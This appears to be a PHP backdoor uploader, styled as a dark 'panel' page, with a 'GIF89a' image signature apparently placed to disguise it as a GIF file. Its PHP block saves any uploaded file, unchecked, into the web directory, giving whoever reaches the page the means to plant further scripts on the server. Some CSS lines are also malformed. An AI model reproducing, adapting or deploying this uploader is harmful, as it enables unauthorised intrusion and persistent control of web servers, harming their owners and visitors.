<link rel='shortcut icon' href='http://www.dz-streaming.eu/favicon.ico'> 
 <style type='text/css'> 
 input[type=submit], input[type=button], input[type=reset]{ 
    text-align:center; 
    background:url(http://i43.tinypic.com/5owgmq.jpg) repeat-x center bottom #666666; 
    border:1px solid #4D4D4D; 
    color:#CCCCCC; 
    border-top-color:#565656; 
    padding:4px 6px; 
    margin:4px 5px; 
    height:16px; 
    -moz-box-shadow:0 0 1px black; 
    -webkit-box-shadow:0 0 1px black; 
    box-shadow:0 0 1px black; 
    text-shadow:0 1px black; 
    -moz-border-radius:4px; 
    -webkit-border-radius:4px; 
    -khtml-border-radius:4px; 
    border-radius:4px; 
    height:23px; 
} 
input[type=submit]:hover , input[type=button]:hover, input[type=reset]:hover{ 
    background-position:center top; 
    text-decoration:none; 
} 
input[type=text], input[type=password]{ 
    background:urlhttp://i43.tinypic.com/5owgmq.jpg) repeat-x center bottom #666666; 
    border:1px solid #4D4D4D; 
    color:#CCCCCC; 
    border-top-color:#565656; 
    -moz-box-shadow:0 0 1px black; 
    -webkit-box-shadow:0 0 1px black; 
    box-shadow:0 0 1px black; 
    -moz-border-radius:4px; 
    -webkit-border-radius:4px; 
    -khtml-border-radius:4px; 
    border-radius:4px; 
    height:18px; 
    margin-left: 5px; 
} 
input , textarea , button , body , caption , table ,area , option { 
    outline:none; 
    transition: all 0.20s ease-in-out; 
    -webkit-transition: all 0.25s ease-in-out; 
    -moz-transition: all 0.25s ease-in-out; 
    border-radius:3px; 
    -webkit-border-radius:3px; 
    -moz-border-radius:3px; 
    border:1px solid rgba(0,0,0, 0.2); 
 /*   font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif; */ 
} 
input , textarea { 
    background: url('http://i41.tinypic.com/ibkmd5.png') repeat scroll 0 0 #333333;'; 
} 
input:focus, textarea:focus ,button:active , body:focus , caption:focus , table:focus ,area:focus ,option:focus  { 
    box-shadow: 0 0 5px rgba(0, 0, 255, 1); 
    -webkit-box-shadow: 0 0 5px rgba(0, 0, 255, 1); 
    -moz-box-shadow: 0 0 5px rgba(0, 0, 255, 1); 
    border: 1px solid #CCCC00; 
    background: url('http://i41.tinypic.com/ibkmd5.png') repeat scroll 0 0 #333333;'; 
    overflow: auto; 
/*    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif; */ 
} 
body{ 
/*    font-family : Verdana; */ 
    color : #f9f6f1; 
    font-size : 0.7em; 
    background: url(http://i44.tinypic.com/i56tc9.jpg) no-repeat center top #252525; 
} 
input , textarea { 
    outline:none; 
    transition: all 0.20s ease-in-out; 
    -webkit-transition: all 0.25s ease-in-out; 
    -moz-transition: all 0.25s ease-in-out; 
    border-radius:3px; 
    -webkit-border-radius:3px; 
    -moz-border-radius:3px; 
    border:1px solid rgba(0,0,0, 0.2); 
} 
input:focus, textarea:focus { 
  outline: 0; 
  border-color: rgba(82, 168, 236, 0.8); 
  -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); 
  -moz-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); 
  box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1), 0 0 8px rgba(82, 168, 236, 0.6); 
    background: url('http://i41.tinypic.com/ibkmd5.png') repeat scroll 0 0 #333333;'; 
    overflow: auto; 
} 
  </style> 
  GIF89a  <head>
<style>
<!--
p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}-->
</style>
</head>

<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#666666" cellpadding="5" height="1" width="100%" bgcolor="#000000" bordercolorlight="#c0c0c0" border="1">
	<tr>
		<a bookmark="minipanel" style="font-weight: normal; color: #009900; font-family: verdana; text-decoration: none">
		<td width="50%" height="1" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px">
		<center>Upload<form method="POST" enctype="multipart/form-data">
			<input type="hidden" name="act" value="upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900">
			<input type="file" name="userfile" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900">
			<input type="submit" name="submit" value="Upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><br><br>
			<?php
$uploaddir = "";
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

if (isset($_FILES['userfile']['name'])) {
        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
                echo "The file ". basename($_FILES['userfile']['name']) ." has been uploaded";
        } else {
                echo "There was an error uploading the file. please try again!";
        }
}
?>
		</form>
		</center></td>
	</tr>
</table>
</a>